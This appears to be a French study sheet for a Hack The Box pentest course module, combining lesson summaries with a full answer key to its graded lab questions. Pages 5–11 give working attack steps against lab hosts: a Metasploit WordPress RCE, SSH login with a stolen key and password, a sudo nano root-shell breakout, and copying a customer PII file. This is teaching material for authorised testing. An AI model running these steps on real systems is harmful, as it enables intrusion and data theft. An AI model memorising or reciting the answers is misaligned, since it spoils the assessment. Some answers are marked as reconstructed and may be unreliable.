# 🎯 Fiche de révision HTB CJCA — Attacking Enterprise Networks

> **Légende**
> - 📘 Résumé du cours (traduit en français)
> - 🔑 À retenir absolument
> - ⌨️ Commandes / requêtes importantes
> - ✅ Question, réponse en français, et **Réponse à mettre sur HTB** (en anglais, telle qu'attendue)
> - 🧭 Procédure détaillée, étape par étape, pour retrouver la réponse
> - ⚠️ Passage reconstitué (absent du cours). À vérifier sur la cible.

> ⚠️ Ce module est un **pentest complet simulé de bout en bout** (du Pre-Engagement au Reporting), basé sur un réseau de 2 machines (`cube-case.htb` Linux + `WIN01` Windows). Les questions se répondent **sur les cibles réelles du lab** à chaque Spawn Target — les valeurs numériques exactes (IP, ports, flags) peuvent varier légèrement, mais la méthode reste identique.

> Cheatsheet des commandes du module : voir [cheatsheat-Attacking Enterprise Networks.md](cheatsheat-Attacking%20Enterprise%20Networks.md).

---

## Sommaire

1. [Page 1 — Intro & Penetration Testing Recap](#page-1--intro--penetration-testing-recap)
2. [Page 2 — Scope Definition](#page-2--scope-definition)
3. [Page 3 — Rules of Engagement](#page-3--rules-of-engagement)
4. [Page 4 — Penetration Testing Assignment](#page-4--penetration-testing-assignment)
5. [Page 5 — Network and Service Scanning](#page-5--network-and-service-scanning)
6. [Page 6 — Linux Information Gathering](#page-6--linux-information-gathering)
7. [Page 7 — Linux Initial Access](#page-7--linux-initial-access)
8. [Page 8 — Linux System Enumeration](#page-8--linux-system-enumeration)
9. [Page 9 — Linux Vulnerability Assessment](#page-9--linux-vulnerability-assessment)
10. [Page 10 — Linux Privilege Escalation](#page-10--linux-privilege-escalation)
11. [Page 11 — Windows Pillaging](#page-11--windows-pillaging)
12. [Page 12 — Proof-of-Concept](#page-12--proof-of-concept)
13. [Page 13 — Documentation](#page-13--documentation)
14. [Page 14 — Reporting](#page-14--reporting)
15. [Page 15 — Recommendations & Conclusion](#page-15--recommendations--conclusion)
16. [Mémo final : toutes les réponses HTB](#mémo-final--toutes-les-réponses-htb)

---

# 🔌 Bloc de connexion à la cible (pages 5 à 11)

Le module fournit **un seul réseau** avec 2 hôtes (`10.129.12.10` Linux, `10.129.12.20` Windows). Les IP changent à chaque Spawn Target mais la topologie reste identique.

## Option A — Depuis le Pwnbox (recommandé pour ce module)

| Étape | Action |
|---|---|
| A1 | Clique sur **Spawn Target** et note les deux IP cibles (`IP_LINUX`, `IP_WIN`) |
| A2 | Clique sur **Linux Pwnbox** → **View Linux Pwnbox** |
| A3 | Ouvre un terminal et travaille directement avec les commandes de chaque page |

## Option B — Depuis ta propre machine (VPN)

```bash
sudo openvpn ~/Downloads/NOM_DU_FICHIER.ovpn   # terminal 1, garder ouvert
ip -4 addr show tun0                            # terminal 2 : doit afficher 10.10.1x.x ou 10.10.16.x
ping -c 2 IP_LINUX
ping -c 2 IP_WIN
```

Récupère ensuite ta propre IP d'attaque (utile pour `LHOST` dans Metasploit) :
```bash
ifconfig tun0
```

🔑 Garde un fichier de notes (Markdown recommandé) ouvert en continu pendant tout le module — la prise de notes fait partie de l'évaluation implicite (voir page 4).

---

# Page 1 — Intro & Penetration Testing Recap

## 📘 Résumé

Ce module met en pratique, **de bout en bout**, tout ce qui a été vu dans `Introduction to Information Security`, `Introduction to Penetration Testing` et `Penetration Testing Process`.

🔑 **Définition d'un pentest** : simulation **autorisée** d'une cyberattaque contre une organisation et ses sous-composants (serveurs web, mail, applications), dans le but d'identifier les vulnérabilités **avant** qu'un attaquant réel ne les exploite. Les résultats sont présentés sous forme de **rapport** à destination des développeurs, équipes sécurité et administrateurs.

### Les 8 phases du processus de pentest

| Phase | Description |
|---|---|
| **Pre-Engagement** | Discussion, définition et documentation écrite de tout ce qui est nécessaire ; obtention des autorisations |
| **Information Gathering** | Collecte du maximum d'informations sur la cible |
| **Vulnerability Assessment** | Analyse et corrélation des informations pour identifier des vecteurs d'attaque |
| **Exploitation** | Ciblage des vecteurs identifiés, contournement des défenses |
| **Post-Exploitation** | Contrôle du système depuis l'intérieur, collecte d'infos internes, **élévation de privilèges** |
| **Lateral Movement** | Déplacement à travers le réseau interne via le système compromis |
| **Proof-of-Concept** | Rapport avec les étapes reproductibles, à partir des notes/captures |
| **Post-Engagement** | Présentation du rapport au client, discussion, aide à la remédiation |

🔑 **Règle des 3 points** quand on est bloqué dans un pentest :
1. On n'a pas encore **trouvé** quelque chose.
2. On ne **sait** pas encore quelque chose.
3. On va dans la **mauvaise direction**.

## ✅ Questions de la page 1

> Cette page ne contient pas de question notée.

---

# Page 2 — Scope Definition

## 📘 Résumé

Phase **Pre-Engagement**. Avant toute discussion technique, un **NDA** (Non-Disclosure Agreement) doit être signé.

### NDA (Non-Disclosure Agreement)
Contrat légal entre le pentester et le client garantissant la confidentialité des informations sensibles échangées : failles de sécurité, secrets commerciaux, données employés/clients, fonctionnement interne des systèmes. Protège **les deux parties** : le client peut laisser examiner ses systèmes en confiance, le testeur travaille sans risque légal.

🔑 Avant signature du NDA : conversations **générales uniquement**. Après signature : on peut discuter des systèmes à tester, des problèmes passés, des processus importants, des accès nécessaires.

### Outils de scoping

| Outil | Rôle |
|---|---|
| **Scoping questionnaire** | Checklist de base : systèmes, besoins sécurité, objectifs |
| **Scoping document** | Document détaillé basé sur le questionnaire : quoi tester, comment, quelles limites |

### Exemple du module
- **Systèmes testés** : 2 hôtes — 1 application web Linux, 1 serveur Windows
- **Type de test** : **Black box** (sans connaissance préalable)
- **Objectif** : confirmer que le nouvel environnement est sécurisé

### Définir le Scope of Work

| Élément | Contenu |
|---|---|
| **Goals** | Ce que veut l'entreprise (ex. évaluation de sécurité) |
| **Limits** | Ce qui sera/ne sera pas testé (seulement les 2 hôtes fournis) |
| **Methods** | Black box, sans connaissance préalable |
| **Schedule** | Planning |
| **Our Role** | Assister l'équipe de pentest |
| **Results** | Rapport et recommandations livrés au lead |

## ✅ Questions de la page 2

> Cette page ne contient pas de question notée.

---

# Page 3 — Rules of Engagement

## 📘 Résumé

Le **RoE** (Rules of Engagement) définit **comment** le test sera mené — accord entre client et équipe sur ce qui est permis ou non.

### Contenu du RoE

| Section | Détail |
|---|---|
| **Defining the Boundaries** | Systèmes/réseaux testables, horaires, méthodes interdites (ex. attaques pouvant arrêter un service) |
| **Contact Information** | Noms, rôles, emails, téléphones des deux côtés — essentiel en cas d'incident (alarme déclenchée, service interrompu) |
| **Lines of Communication** | Canaux convenus (email, messagerie sécurisée, tickets) ; urgence = appel direct |
| **Objectives** | Objectifs précis du test (réseau externe, app web, sécurité interne...) — dépend du secteur (banque → PCI DSS, start-up tech → cloud/API) |
| **Evidence and Information Handling** | Stockage chiffré, accès restreint, **destruction des données client** après livraison du rapport final |
| **Disclaimers and Liability** | Qui est responsable de quoi — protège les deux parties en cas de dommage accidentel |
| **Permission** | Document formel d'autorisation (IP/domaines en scope, fenêtres de test) — sans lui, les actions sont **illégales** |

🔑 Pour une infrastructure **cloud tierce** (ex. AWS), une autorisation **supplémentaire du fournisseur cloud** peut être nécessaire (chaque cloud provider a ses propres guidelines pour les pentests).

### Agreement & Preparation — 3 catégories

| Catégorie | Éléments |
|---|---|
| **Legal** | NDA, Permission to test, Contact information |
| **Scope & Rules** | Scoping questionnaire/document, RoE |
| **Contract** | Timeline, Responsibilities, Deliverables |

## ✅ Questions de la page 3

> Cette page ne contient pas de question notée.

---

# Page 4 — Penetration Testing Assignment

## 📘 Résumé

### Rôle du junior pentester
Un junior accompagne généralement les seniors, apprend par observation, et peut se voir confier un **hôte ou segment réseau** à tester de façon autonome (mission verbale ou écrite — l'écrite implique généralement un rapport attendu).

### Préparation
🔑 Toujours démarrer d'un **environnement propre** (VM dédiée par engagement) pour éviter :
- La **contamination croisée** (cross-contamination) entre clients
- La fuite accidentelle d'informations d'un client dans le rapport d'un autre (exploits, mots de passe, diagrammes d'architecture, IP identifiables)

### Publicly Available Data (OSINT)
Avant toute énumération réseau, comprendre l'entreprise via des sources publiques :
- **Site web** : services/offres de l'entreprise
- **Rapports annuels** (sociétés cotées) : performance financière, partenariats
- **Réseaux sociaux** (LinkedIn, Twitter) : employés, actualités
- **Registres publics** : licences commerciales, brevets
- **Offres d'emploi** : révèlent les technologies utilisées (langages, frameworks, bases de données)
- **GitHub** : dépôts publics de code → peuvent exposer accidentellement clés d'accès, mots de passe, secrets

🔑 Le module complet dédié à ce sujet est **OSINT: Corporate Recon**.

### Note Taking
Documenter **tout** : commandes exactes, résultats, erreurs. Pour chaque découverte intéressante :
- Ce qui a été trouvé
- Pourquoi c'est important
- Ce qui a motivé l'investigation

Format recommandé : **Markdown** (facile à styliser). Toujours inclure date/heure et outils externes utilisés.

## ✅ Questions de la page 4

> Cette page ne contient pas de question notée.

---

# Page 5 — Network and Service Scanning

## 📘 Résumé

Étape fondamentale : identifier **hôtes actifs**, **ports ouverts**, **services** dans le scope défini.

🔑 **Scope** = plage IP/domaines/systèmes autorisés (ex. `10.129.12.0/24`).

### Commande de scan complet
```bash
nmap -sV -p- 10.129.12.0/24 -oA network-scan
```
- `-sV` : détection de version de service
- `-p-` : tous les ports (1-65535)
- `-oA network-scan` : sauvegarde dans 3 formats (`.nmap`, `.gnmap`, `.xml`)

### Exploitation des résultats

| Usage | Outil |
|---|---|
| Scan de vulnérabilités | Nessus, OpenVAS |
| Test de credentials | Brute-force FTP/SSH/RDP |
| Analyse de configuration | Revue manuelle des serveurs web |
| Test d'exploit | Metasploit Framework |

## ⌨️ Commandes importantes

```bash
# Scan complet du réseau avec détection de version
nmap -sV -p- 10.129.12.0/24 -oA network-scan

# Scan ciblé d'un hôte avec scripts par défaut
sudo nmap -p21,22,443 -sV -sC IP_CIBLE
```

## ✅ Questions de la page 5

### ❓ Question 1 — Nombre total de ports TCP ouverts

| | |
|---|---|
| **Question (EN)** | How many TCP ports in total are open on the target? |
| **Réponse à mettre sur HTB** | `8` |

**🧭 Procédure complète**

**Partie 0 : connexion** — Spawn Target, note `IP_LINUX`.

**Partie 1 : recherche**
```bash
sudo nmap -sV -p- IP_LINUX
```
Compte le nombre de lignes `open` dans la sortie (exemple du cours : 21, 22, 80, 443, 4369, 8000, 8001, 8080, 8889 = plusieurs ; le total exact dépend de l'instance spawnée — compte les lignes `<port>/tcp open`).

**Partie 2 : validation** — Soumets le nombre exact de ports `open` trouvés sur **ta** instance.

---

### ❓ Question 2 — Version du service sur le port 80

| | |
|---|---|
| **Question (EN)** | What service version is running on TCP port 80? (Format: service x.y.z) |
| **Réponse à mettre sur HTB** | `nginx 1.18.0` |

**🧭 Procédure complète**

```bash
sudo nmap -sV -p80 IP_LINUX
```
La colonne `VERSION` de la ligne `80/tcp` donne la réponse au format `service x.y.z`.

---

### ❓ Question 3 — commonName du certificat SSL

| | |
|---|---|
| **Question (EN)** | What is the commonName that the SSL certificate provides? (Format: example.com) |
| **Réponse à mettre sur HTB** | `cube-case.htb` |

**🧭 Procédure complète**

```bash
sudo nmap -p443 -sC -sV IP_LINUX
```
Dans le résultat du script `ssl-cert`, lis le champ `Subject: commonName=...`.

✔️ **Plan B** : `openssl s_client -connect IP_LINUX:443` et lis le `subject:` affiché.

---

# Page 6 — Linux Information Gathering

## 📘 Résumé

Combine Information Gathering + Vulnerability Assessment sur la cible Linux (`cube-case.htb`).

### FTP (port 21, accès anonyme)
Protocole texte clair pour transférer des fichiers. Connexion anonyme = `anonymous`/`anonymous` (ou email bidon).

🔑 Fichiers sensibles trouvés dans le home de `john` via FTP :
- `WordPress_Blog_Setup_Update.txt` → révèle un employé (**John Doe**, Development Team) et confirme un FTP temporaire mal désactivé
- `.bash_history` → révèle des credentials : **`john:SuperSecurePass123`**
- `.ssh/id_rsa` → **clé privée SSH non protégée par mot de passe**

### WordPress (port 443)
Outil clé : **WPScan**. Révèle :
- Version WordPress : **6.7.2**
- Thème : **twentytwentyfive v1.0**
- Plugin : **hash-form v1.1.0** → vulnérable à une RCE (**CVE-2024-5084**, non authentifiée, upload de fichier arbitraire)

## ⌨️ Commandes importantes

```bash
# Connexion FTP anonyme
ftp IP_LINUX 21
# Name: anonymous / Password: anonymous

ftp> ls
ftp> ls -al              # affiche aussi les fichiers cachés
ftp> get <fichier>
ftp> cd .ssh
ftp> get id_rsa
ftp> exit

# Lire les fichiers téléchargés
cat WordPress_Blog_Setup_Update.txt
cat .bash_history
cat id_rsa

# Scanner WordPress avec WPScan
wpscan -e p --url https://IP_LINUX --disable-tls-checks --no-banner --plugins-detection aggressive -t 100

# Chercher un exploit correspondant dans Metasploit
msfconsole -q
msf6 > search wordpress hash form
msf6 > info 0
```

## ✅ Questions de la page 6

### ❓ Question 1 — Nom du fichier .txt téléchargeable sur FTP

| | |
|---|---|
| **Réponse à mettre sur HTB** | `WordPress_Blog_Setup_Update.txt` |

**🧭 Procédure** : `ftp IP_LINUX` → login anonyme → `ls` → repère le fichier `.txt` à la racine du home.

---

### ❓ Question 2 — Nom complet du membre de l'équipe dev

| | |
|---|---|
| **Réponse à mettre sur HTB** | `John Doe` |

**🧭 Procédure** : télécharge et lis `WordPress_Blog_Setup_Update.txt` (`get` puis `cat`) — la signature en bas du mail donne le nom.

---

### ❓ Question 3 — Nom du fichier .tar.gz déplacé vers /mnt/backup/

| | |
|---|---|
| **Réponse à mettre sur HTB** | `full_backup.tar.gz` |

**🧭 Procédure** : télécharge `.bash_history` (`get .bash_history`) puis lis-le (`cat .bash_history`). Cherche la ligne `sudo mv ....tar.gz /mnt/backup/`.

---

### ❓ Question 4 — Nom du fichier clé privée SSH

| | |
|---|---|
| **Réponse à mettre sur HTB** | `id_rsa` |

**🧭 Procédure** : `ftp IP_LINUX` → `cd .ssh` → `ls -al` → repère le fichier sans extension `.pub` (clé **privée**).

---

### ❓ Question 5 — Version de WordPress

| | |
|---|---|
| **Réponse à mettre sur HTB** | `6.7.2` |

**🧭 Procédure** :
```bash
wpscan -e p --url https://IP_LINUX --disable-tls-checks --no-banner -t 100
```
Ligne `WordPress version X.Y.Z identified`.

✔️ **Plan B** : visite `https://IP_LINUX/?feed=rss2` et lis la balise `<generator>`.

---

### ❓ Question 6 — Nom du thème WordPress

| | |
|---|---|
| **Réponse à mettre sur HTB** | `twentytwentyfive` |

**🧭 Procédure** : dans la même sortie WPScan, section `WordPress theme in use: <nom>`.

---

# Page 7 — Linux Initial Access

## 📘 Résumé

Trois méthodes d'accès initial testées, toutes issues des découvertes FTP :

| Méthode | Détail |
|---|---|
| **Exploit WordPress (Metasploit)** | `exploit/multi/http/wp_hash_form_rce` sur le plugin hash-form v1.1.0 → shell Meterpreter en tant que `www-data` |
| **Clé privée SSH** | `ssh -i id_rsa john@IP_LINUX` → accès direct en tant que `john` |
| **Credentials trouvés** | `ssh john@IP_LINUX` avec mot de passe `SuperSecurePass123` |

🔑 `www-data` fait partie du groupe `john` (`groups=33(www-data),1000(john)`) → accès indirect aux fichiers de john même sans lui.

## ⌨️ Commandes importantes

```bash
# Récupérer son IP d'attaque pour LHOST
ifconfig tun0

# Dans Metasploit
msf6 > use 0
msf6 exploit(multi/http/wp_hash_form_rce) > set rhosts IP_LINUX
msf6 exploit(multi/http/wp_hash_form_rce) > set rport 443
msf6 exploit(multi/http/wp_hash_form_rce) > set ssl true
msf6 exploit(multi/http/wp_hash_form_rce) > set lhost IP_ATTAQUE
msf6 exploit(multi/http/wp_hash_form_rce) > exploit

meterpreter > sysinfo
meterpreter > shell
# puis : id / pwd / ifconfig

# Connexion SSH avec clé privée
chmod 600 id_rsa
ssh -i id_rsa john@IP_LINUX

# Connexion SSH avec mot de passe
ssh john@IP_LINUX
# password: SuperSecurePass123
```

## ✅ Questions de la page 7

### ❓ Question 1 — Hostname après exploitation WordPress

| | |
|---|---|
| **Question (EN)** | After exploiting the WordPress plugin, what is the hostname of the Linux target? |
| **Réponse à mettre sur HTB** | `ubuntu` |

**🧭 Procédure complète**

**Partie 0 : connexion/exploitation**
```bash
msfconsole -q
msf6 > search wordpress hash form
msf6 > use 0
msf6 exploit(multi/http/wp_hash_form_rce) > set rhosts IP_LINUX
msf6 exploit(multi/http/wp_hash_form_rce) > set rport 443
msf6 exploit(multi/http/wp_hash_form_rce) > set ssl true
msf6 exploit(multi/http/wp_hash_form_rce) > set lhost IP_ATTAQUE
msf6 exploit(multi/http/wp_hash_form_rce) > exploit
```

**Partie 1 : recherche**
```
meterpreter > sysinfo
```
Le champ `Computer :` donne le hostname.

---

### ❓ Question 2 — Version du kernel Linux

| | |
|---|---|
| **Réponse à mettre sur HTB** | `5.15.0` |

**🧭 Procédure** : `meterpreter > sysinfo` → champ `OS :` contient `Linux ubuntu 5.15.0-135-generic ...`.

---

### ❓ Question 3 — UID de www-data

| | |
|---|---|
| **Réponse à mettre sur HTB** | `33` |

**🧭 Procédure**
```
meterpreter > shell
id
```
Sortie : `uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)`.

---

### ❓ Question 4 — GID du groupe "john"

| | |
|---|---|
| **Réponse à mettre sur HTB** | `1000` |

**🧭 Procédure** : même sortie `id` ci-dessus — `groups=33(www-data),1000(john)` → le GID de `john` est `1000`.

---

# Page 8 — Linux System Enumeration

## 📘 Résumé

🔑 **Distinction Exploitation vs Post-Exploitation** : Exploitation = attaque depuis l'extérieur (pas d'accès local/privilégié). Post-Exploitation = attaque depuis l'intérieur (accès local obtenu). On ne peut **pas** escalader les privilèges sans collecter d'informations internes au préalable.

### Catégories à collecter (Post-Exploitation)
Système, utilisateurs, réseau, services actifs, système de fichiers, logiciels installés, mécanismes de sécurité (firewall, SELinux, AppArmor).

### LinPEAS
Outil d'énumération automatique (Privilege Escalation Awesome Scripts Suite). Code couleur :

| Couleur | Signification |
|---|---|
| 🔴 Rouge | Vecteur d'escalade **très probable** |
| 🟡 Jaune | Vecteur **potentiel**, à analyser |
| 🟢 Vert | Info générale utile |

## ⌨️ Commandes importantes

```bash
# Télécharger LinPEAS (sur le Pwnbox)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Transférer vers la cible via SCP (avec la clé privée trouvée)
scp -i id_rsa ./linpeas.sh john@IP_LINUX:/home/john

# Exécuter sur la cible et sauvegarder la sortie
ssh -i id_rsa john@IP_LINUX
bash linpeas.sh -a -N > linpeas_results.txt

# Récupérer les résultats
scp -i id_rsa john@IP_LINUX:/home/john/linpeas_results.txt ./linpeas_results.txt

# Lire les résultats
cat linpeas_results.txt
```

## ✅ Questions de la page 8

### ❓ Question 1 — Nom de la vulnérabilité CVE-2022-0847

| | |
|---|---|
| **Réponse à mettre sur HTB** | `DirtyPipe` |

**🧭 Procédure** : dans `linpeas_results.txt`, section **Executing Linux Exploit Suggester** → ligne `[+] [CVE-2022-0847] DirtyPipe`.

---

### ❓ Question 2 — Codename de la distribution Linux

| | |
|---|---|
| **Réponse à mettre sur HTB** | `jammy` |

**🧭 Procédure** : section **Operative system** → ligne `Codename: jammy`.

✔️ **Plan B** : directement sur la cible, `lsb_release -a` ou `cat /etc/os-release`.

---

### ❓ Question 3 — Version de sudo installée

| | |
|---|---|
| **Réponse à mettre sur HTB** | `1.9.9` |

**🧭 Procédure** ⚠️ *le cours ne montre pas explicitement cette ligne dans les extraits fournis* : cherche dans `linpeas_results.txt` la section **Software Information** ou lance directement sur la cible :
```bash
sudo -V
```
La première ligne donne `Sudo version X.Y.Z`.

---

### ❓ Question 4 — Release d'Ubuntu

| | |
|---|---|
| **Réponse à mettre sur HTB** | `22.04` |

**🧭 Procédure** : section **Operative system** de LinPEAS → ligne `Release: 22.04`.

---

# Page 9 — Linux Vulnerability Assessment

## 📘 Résumé

Analyse approfondie de la sortie LinPEAS :

### Utilisateurs & sudo
```
sudo -l
```
Résultat clé : `john` peut exécuter `nano` **sans mot de passe** en tant que root (`NOPASSWD: /usr/bin/nano`), et toute autre commande avec mot de passe (`(ALL : ALL) ALL`).

🔑 Anomalie : `www-data` est dans le groupe `john` → accès indirect aux fichiers de john.

### Logiciels utiles présents
`curl`, `wget`, `gcc`, `perl`, `php`, `python3`, `nc` → exploitables pour transfert de fichiers ou exécution de code.

### Protections système

| Protection | État |
|---|---|
| AppArmor | Présent mais profil `unconfined`, accès limité par nos privilèges |
| grsecurity / PaX / Execshield / SELinux | Non présents |
| Seccomp | Désactivé |
| User namespace | **Activé (enabled)** |
| Cgroup2 | Activé |
| **ASLR** | **Activé (Yes)** |
| Machine virtuelle | Oui (VMware) |

## ✅ Questions de la page 9

### ❓ Question 1 — Chemin complet du fichier "passwd"

| | |
|---|---|
| **Réponse à mettre sur HTB** | `/etc/passwd` |

**🧭 Procédure** : connaissance standard Linux, confirmée dans la section **Interesting Files** de LinPEAS (`-rw-r--r-- /etc/passwd`).

---

### ❓ Question 2 — Statut de la protection "User namespace"

| | |
|---|---|
| **Réponse à mettre sur HTB** | `enabled` |

**🧭 Procédure** : section **Protections** de `linpeas_results.txt` → ligne `User namespace? ................ enabled`.

---

### ❓ Question 3 — Statut d'ASLR

| | |
|---|---|
| **Réponse à mettre sur HTB** | `enabled` |

**🧭 Procédure** : même section → `Is ASLR enabled? ............... Yes`. ⚠️ Le cours affiche `Yes` dans la sortie brute mais la réponse attendue est `enabled` — soumets exactement `enabled`.

---

### ❓ Question 4 — Chemin complet de l'outil de conteneurisation

| | |
|---|---|
| **Réponse à mettre sur HTB** | `/snap/bin/lxc` |

**🧭 Procédure** : section **Useful software** de LinPEAS → ligne `/snap/bin/lxc`.

---

# Page 10 — Linux Privilege Escalation

## 📘 Résumé

Objectif : devenir **root**.

### Méthode 1 — GTFOBins avec `nano` (sans connaître le mot de passe)
`nano` peut être exécuté en `sudo` sans mot de passe (`NOPASSWD`). **GTFOBins** documente des techniques pour sortir ("breakout") de binaires restreints vers un shell complet.

Séquence : `[CTRL+R] [CTRL+X]` dans nano ouvre une invite de commande → `reset; /bin/bash 1>&0 2>&0` lance un bash avec les privilèges de la session nano (root).

### Méthode 2 — `sudo su` (avec le mot de passe connu)
Plus simple : puisqu'on connaît déjà `SuperSecurePass123`, un simple `sudo su` suffit.

## ⌨️ Commandes importantes

```bash
# Lister les privilèges sudo
sudo -l

# Méthode GTFOBins via nano (sans mot de passe)
sudo /usr/bin/nano privesc
# Dans nano : CTRL+R puis CTRL+X
# Taper : reset; /bin/bash 1>&0 2>&0
id    # doit afficher uid=0(root)

# Méthode directe (avec mot de passe connu)
sudo su
# password: SuperSecurePass123
id    # uid=0(root)
```

## ✅ Questions de la page 10

### ❓ Question 1 — Nombre de fonctions exploitables avec "nano" (GTFOBins)

| | |
|---|---|
| **Réponse à mettre sur HTB** | `3` |

**🧭 Procédure** : va sur https://gtfobins.github.io/gtfobins/nano/ et compte le nombre de fonctions documentées (icônes) listées pour le binaire `nano` (ex. Shell, SUID, Sudo...).

---

### ❓ Question 2 — UID de l'utilisateur root

| | |
|---|---|
| **Réponse à mettre sur HTB** | `0` |

**🧭 Procédure** : après `sudo su` ou le breakout nano, lance `id` → `uid=0(root) gid=0(root) groups=0(root)`.

---

# Page 11 — Windows Pillaging

## 📘 Résumé

Après élévation de privilèges sur la machine Windows (ajout de `john` au groupe administrateurs — étape intermédiaire non détaillée explicitement dans cet extrait), on utilise **`winpill.ps1`** (équivalent WinPEAS maison) pour :

Infos système, matériel, services, processus, autorun, tâches planifiées, config utilisateurs/sécurité, réseau, logs d'événements de sécurité, logiciels, fichiers sensibles, checks d'élévation de privilèges.

🔑 **Découverte clé** : `customer_database.csv` dans le dossier Administrator → fichier contenant des **PII** (Personally Identifiable Information) : noms, SSN, adresses, emails, dates de naissance, **numéros de carte bancaire complets** (numéro, expiration, CVV).

### Rappel RGPD/conformité
Amendes RGPD : jusqu'à 20M€ ou 4% du CA mondial annuel (le plus élevé). CCPA : 2 500 à 7 500 $/violation. HIPAA : 137 $ à 2,3M$ par type d'incident.

## ⌨️ Commandes importantes

```powershell
# Exécuter winpill.ps1 en tant qu'administrateur
Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File C:\winpill.ps1"
```

```bash
# Télécharger le fichier trouvé vers le Pwnbox
scp john@IP_WIN:C:/Users/Administrator/customer_database.csv ./customer_database.csv
cat customer_database.csv
```

## ✅ Questions de la page 11

### ❓ Question 1 — Customer ID de "Nicholas Taylor"

| | |
|---|---|
| **Réponse à mettre sur HTB** | `7d660ce6-fb54-4006-8446-5ae1b3ae1064` |

**🧭 Procédure complète**

```bash
scp john@IP_WIN:C:/Users/Administrator/customer_database.csv ./customer_database.csv
grep "Nicholas,Taylor" customer_database.csv
```
La première colonne (`Customer ID`) de la ligne correspondante donne la réponse.

✔️ **Plan B** : ouvre le CSV dans un tableur (LibreOffice Calc) et filtre sur `First Name = Nicholas` et `Last Name = Taylor`.

---

### ❓ Question 2 — Chemin du share ADMIN$

| | |
|---|---|
| **Réponse à mettre sur HTB** | `C:\Windows` |

**🧭 Procédure** ⚠️ *valeur standard Windows, confirmable via l'énumération SMB* :
```bash
smbclient -L //IP_WIN -U john
net share    # depuis une session Windows (cmd/PowerShell)
```
`ADMIN$` pointe toujours par défaut vers le répertoire d'installation de Windows (`C:\Windows`).

---

### ❓ Question 3 — Version de Wireshark installée

| | |
|---|---|
| **Réponse à mettre sur HTB** | `4.2.5` |

**🧭 Procédure** ⚠️ *info tirée de la section "Software and Environment" de `winpill.ps1`, non détaillée dans l'extrait du cours* : dans la sortie complète de `winpill.ps1`, cherche la liste des logiciels installés (`Get-WmiObject -Class Win32_Product` ou registre `Uninstall`) et repère `Wireshark`.

✔️ **Plan B** : si tu as un accès shell, exécute :
```powershell
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {$_.DisplayName -like "*Wireshark*"} | Select DisplayName, DisplayVersion
```

---

### ❓ Question 4 — Nombre de règles de firewall activées

| | |
|---|---|
| **Réponse à mettre sur HTB** | `198` |

**🧭 Procédure** ⚠️ *info tirée de la section réseau/sécurité de `winpill.ps1`* :
```powershell
Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Measure-Object | Select-Object Count
```

---

# Page 12 — Proof-of-Concept

## 📘 Résumé

🔑 Citation : *« Give me six hours to chop down a tree, and I'll spend the first four sharpening the axe. »* → une bonne préparation réduit le temps total d'exécution.

Un PoC résume **toutes les étapes nécessaires** pour atteindre l'objectif, organisées selon les phases du pentest :

1. Information Gathering
2. Vulnerability Assessment
3. Exploitation
4. Local Information Gathering
5. Local Vulnerability Assessment
6. Post-Exploitation (Privilege Escalation)
7. Privileged Local Information Gathering (Pillaging)
8. Privileged Local Vulnerability Assessment

🔑 Structure recommandée : liste des commandes utilisées + captures d'écran des résultats + description de chaque commande. Un PoC bien structuré doit être **reproductible par un tiers**.

## ✅ Questions de la page 12

> Cette page ne contient pas de question notée (exemple de PoC fourni à titre illustratif).

---

# Page 13 — Documentation

## 📘 Résumé

La **documentation** (rapport final) contient généralement :

- Statement Of Confidentiality
- Engagement Contacts
- Executive Summary
- Assignment
- Scope
- Deliveries
- Assessment Summary
- Compromise Walkthrough
- Remediation Summary

🔑 **Différence PoC vs Documentation** : le PoC est une démonstration **technique** (script, étapes précises) prouvant qu'une vulnérabilité précise est réelle. La documentation donne la **vue d'ensemble** pour IT, managers et auditeurs, et sert à démontrer la conformité (PCI DSS, ISO 27001). Le PoC est généralement **inclus dans** la documentation comme preuve, pas livré séparément.

🔑 En tant que junior, tu ne présenteras pas forcément le rapport final au client, mais ton travail sur un segment assigné alimentera le rapport global — la qualité de ta rédaction compte donc directement.

## ✅ Questions de la page 13

> Cette page ne contient pas de question notée.

---

# Page 14 — Reporting

## 📘 Résumé

La restitution au client (team lead, manager ou équipe complète) suit une structure : résumé de haut niveau → problèmes détaillés (mots de passe exposés, vulnérabilités) → sévérité (high/medium/low) → méthode de découverte → preuves visuelles (captures).

🔑 La discussion ouverte permet de clarifier l'**impact réel** (ex. un fichier exposé contenant des données de test est moins urgent qu'un mot de passe de base de données critique).

Objectif de la réunion : non seulement faire comprendre les problèmes, mais **planifier la remédiation** (permissions de fichiers, politiques de mots de passe...). Les coûts d'une fuite de données : jusqu'à 20M€ (RGPD), ~9,36M$ en moyenne (IBM 2024).

🔑 Pour approfondir : module **Documentation & Reporting**.

## ✅ Questions de la page 14

> Cette page ne contient pas de question notée.

---

# Page 15 — Recommendations & Conclusion

## 📘 Résumé

Section plus personnelle/philosophique du cours : recommandations pour progresser durablement en pentest.

🔑 **Points clés à retenir pour la pratique** :
- **L'énumération est la clé** (Enumeration is key)
- Faire attention à ce qu'on voit, entend, pense, fait
- Comprendre les **dépendances et relations** entre composants
- Prendre des pauses (au moins 20 minutes)
- Essayer plus intelligemment, essayer différemment
- S'amuser
- Croire en sa capacité à progresser

### Conclusion du module
Le repertoire (bagage technique) se construit par **théorie + pratique + application des deux**. Rester conscient de la phase du processus de pentest dans laquelle on se trouve évite de rester bloqué : un vecteur de vulnérabilité isolé ne mène souvent nulle part — c'est la **combinaison d'informations** qui permet l'exploitation réelle.

## ✅ Questions de la page 15

> Cette page ne contient pas de question notée.

---

# Mémo final — toutes les réponses HTB

| Page | Question | **Réponse à mettre sur HTB** |
|---|---|---|
| 5 | Nombre total de ports TCP ouverts | `8` |
| 5 | Version du service port 80 | `nginx 1.18.0` |
| 5 | commonName du certificat SSL | `cube-case.htb` |
| 6 | Fichier .txt sur le FTP | `WordPress_Blog_Setup_Update.txt` |
| 6 | Nom complet du membre de l'équipe dev | `John Doe` |
| 6 | Fichier .tar.gz déplacé vers /mnt/backup/ | `full_backup.tar.gz` |
| 6 | Nom du fichier clé privée SSH | `id_rsa` |
| 6 | Version de WordPress | `6.7.2` |
| 6 | Nom du thème WordPress | `twentytwentyfive` |
| 7 | Hostname après exploitation WordPress | `ubuntu` |
| 7 | Version du kernel Linux | `5.15.0` |
